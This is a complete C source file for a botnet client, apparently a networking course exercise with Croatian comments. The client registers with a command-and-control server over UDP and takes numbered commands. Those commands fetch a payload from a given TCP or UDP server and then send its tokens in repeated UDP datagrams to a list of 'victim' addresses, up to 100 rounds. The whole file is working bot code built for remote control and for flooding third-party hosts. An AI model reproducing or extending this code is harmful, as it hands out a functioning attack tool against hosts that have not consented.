#include<sys/socket.h>
#include<unistd.h>
#include<netdb.h>
#include<string.h>
#include<stdio.h>
#include<stdlib.h>
#include<err.h>
#include<arpa/inet.h>
#include<fcntl.h>

#define MAX_BUFF_LEN 761

struct MSG{
    char IP[INET_ADDRSTRLEN];
    char PORT[22];
};

int Setsockopt(int sockfd, int level, int optname, void *opval, socklen_t optlen){
    int n = setsockopt(sockfd, level, optname, opval, optlen);
    if(n){
        errx(1, "Fatal error while seting socket options.");
    }

    return (n);
}

int Connect(int sockfd, const struct sockaddr *server, socklen_t addrlen){
    int n;

    n = connect(sockfd, server, addrlen);

    if(n == -1){
        errx(1, "Fatal error while connecting");
    }

    return (n);
}

ssize_t Sendto(int sockfd, void *buff, size_t nbytes, int flags, const struct sockaddr* to, socklen_t addrlen){
    int n;
    n = sendto(sockfd, buff, nbytes, flags, to, addrlen);

    if(n == -1){
        errx(1, "Fatal error while sending data");
    }

    return(n);
}

ssize_t Recvfrom(int sockfd, void *buff, size_t nbytes, int flags, struct sockaddr *from, socklen_t *fromaddrlen){
    int n;
    n = recvfrom(sockfd, buff, nbytes, flags, from, fromaddrlen);

    if(n == -1){
        errx(1, "Fatal error while recieving data");
    }

    return(n);
}

int Getaddrinfo(const char *hostname, const char *service, const struct addrinfo *hints, struct addrinfo **result){
    int n;
    n = getaddrinfo(hostname, service, hints, result);
    if(n) errx(1, "%s", gai_strerror(n));

    return(n);
}

int Socket(int family, int type, int protocol){
    int n;
    if((n = socket(family, type, protocol)) == -1){
        err(1, "Fatal error while creating socket.");
    }

    return(n);
}

int main(int argc, char *argv[]){

    if(argc != 3){
        printf("Usage: ./bot ip port\n");
        return 1;
    }

    char *CChostname = argv[1];
    char *CCport = argv[2];

    //bot socket UDP
    int botsockUDP = Socket(PF_INET, SOCK_DGRAM, 0);
    int flags = fcntl(botsockUDP, F_GETFL, 0);
    fcntl(botsockUDP, F_SETFL, flags | O_NONBLOCK);

    //bot socket TCP
    int botsockTCP = Socket(PF_INET, SOCK_STREAM, 0);

    //C&C sockaddr
    struct sockaddr *CC;
    struct addrinfo hints, *res;
    socklen_t CClen;
    char *message = "REG\n";

    //recv from C&C
    char buf[MAX_BUFF_LEN];
    struct MSG msg;
    char command;

    //C&C info
    memset(&hints, 0, sizeof hints);

    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM; 
    hints.ai_flags = AI_PASSIVE;

    Getaddrinfo(CChostname, CCport, &hints, &res);
    CC = res->ai_addr;
    CClen = res->ai_addrlen;

    //send REG to C&C
    Sendto(botsockUDP, message, strlen(message), 0, CC, CClen);

    while(1){
        int recievedBytesFromCC = recvfrom(botsockUDP, buf, MAX_BUFF_LEN, 0, CC, &CClen);
        if(recievedBytesFromCC <= 0){
            continue;
        }

        //provjeri komandu
        /*
            0 -> break, bot prestaje s radom
            1 -> "HELLO\n" na primljeni ip:port TCP
            2 -> "HELLO\n" na primljeni ip:port UDP
            3 -> na primljene ip:port salje UDP datagrame payload1, payload2...
            4 -> bot prestaje slati poruke zrtvama
        */
       command = buf[0];
       printf("C&C poslao komandu: %d\n", command);

       char payload[1024];
       char end[100];

       //0
       if(command == 48){
           break;
       }else if(command == 49){ //1
            //TCP server
            struct sockaddr *TCPserver;
            struct addrinfo hintsTCP, *resTCP;
            socklen_t TCPlen;
            const char *message = "HELLO";

            memset(&hintsTCP, 0, sizeof hintsTCP);

            hintsTCP.ai_family = AF_INET;
            hintsTCP.ai_socktype = SOCK_STREAM;
            hintsTCP.ai_flags = AI_PASSIVE;

            //get TCP server IP:PORT
            memcpy(&msg.IP, buf + 1, INET_ADDRSTRLEN);
            memcpy(&msg.PORT, buf + 1 + INET_ADDRSTRLEN, 22);

            //TCP server info
            Getaddrinfo(msg.IP, msg.PORT, &hintsTCP, &resTCP);
            TCPserver = resTCP->ai_addr;
            TCPlen = resTCP->ai_addrlen;

            //TCP 3-way handshake
            Connect(botsockTCP, TCPserver, TCPlen);

            printf("Saljem HELLO na TCP %s %s\n", msg.IP, msg.PORT);
            int r = send(botsockTCP, (const void *)message, strlen(message) + 1, 0);
            printf("Broj poslanih bajtova: %d\n", r);
        
            //primi payload od TCP servera
            int recievedBytes = 0;

            while (1){
                r = recv(botsockTCP, payload + recievedBytes, 1, 0);
        
                if(r == -1){
                    errx(1, "Failure");
                }
                if (r > 0){
                    recievedBytes = recievedBytes + r;
                }
                
                if(payload[recievedBytes - 1]== '\n'){
                    break;
                }
            }
            payload[recievedBytes - 1] = '\0';
            printf("%s\n", payload);
            close(botsockTCP);

       }else if(command == 50){ //2
            //UDP server
            struct sockaddr *UDPserver;
            struct addrinfo hintsUDP, *resUDP;
            socklen_t UDPlen;
            const char *message = "HELLO";

            memset(&hintsUDP, 0, sizeof hintsUDP);

            hintsUDP.ai_family = AF_INET;
            hintsUDP.ai_socktype = SOCK_DGRAM;
            hintsUDP.ai_flags = AI_PASSIVE;

            //get UDP server IP:PORT
            memcpy(&msg.IP, buf + 1, INET_ADDRSTRLEN);
            memcpy(&msg.PORT, buf + 1 + INET_ADDRSTRLEN, 22);

            printf("Saljem HELLO na UDP %s %s\n", msg.IP, msg.PORT);


            //UDP server info
            Getaddrinfo(msg.IP, msg.PORT, &hintsUDP, &resUDP);
            UDPserver = resUDP->ai_addr;
            UDPlen = resUDP->ai_addrlen;

            Sendto(botsockUDP, (void *)message, strlen(message), 0, UDPserver, UDPlen);

            //primi UDP poruku
            int msglen = recvfrom(botsockUDP, payload, 1024, 0, UDPserver, &UDPlen);

            if(msglen == -1){
                errx(1, "%s", "Error while recieving data.");
            }

            payload[msglen - 1] = '\0';
            printf("%s\n", payload);

       }else if(command == 51){ //3

            struct sockaddr *zrtva;
            struct addrinfo hintsZrtva, *resZrtva;
            socklen_t zrtvalen;

            struct sockaddr_in recvAddr;
            socklen_t recvAddrlen = sizeof(recvAddr);


           for(int times = 0; times < 100; times++){
                char tmp[sizeof(payload)];
                memcpy(tmp, payload, sizeof(payload));
                char *token = strtok(tmp, ":");
                while(token != NULL){
                    memset(&hintsZrtva, 0, sizeof hintsZrtva);

                    hintsZrtva.ai_family = AF_INET;
                    hintsZrtva.ai_socktype = SOCK_DGRAM;

                    int brojIteracija = (recievedBytesFromCC - 1) / 38;
                    int b1, b2;
                    for(int i = 1; i <= brojIteracija; i++){
                        if(i == 1){
                            b1 = 1;
                            b2 = b1 + 16;
                        }else{
                            b1 = b2 + 22;
                            b2 = b1 + 16;
                        }

                        memcpy(&msg.IP, buf + b1, INET_ADDRSTRLEN);
                        memcpy(&msg.PORT, buf + b2, 22);

                        int error = Getaddrinfo(msg.IP, msg.PORT, &hintsZrtva, &resZrtva);
                        zrtva = resZrtva->ai_addr;
                        zrtvalen = resZrtva->ai_addrlen;
                        sendto(botsockUDP, token, strlen(token), 0,(const struct sockaddr *) zrtva, zrtvalen);
                       
                        printf("Poslao %s na %s:%s\n", token, msg.IP, msg.PORT);
                        if(error == -1){
                            errx(1, "%s", "Error while sending data.");
                        }
                    }
                
                    token = strtok(NULL, ":");
                }
                    
                sleep(1);
                //zrtva vraca poruku
                int r = recvfrom(botsockUDP, end, sizeof(end), 0, (struct sockaddr *)&recvAddr, &recvAddrlen);
                if(r >= 0){
                    break;
                } 
            }

       }else if(command == 52){ //4
            break;
       }
    }

    close(botsockTCP);
    close(botsockUDP);
}

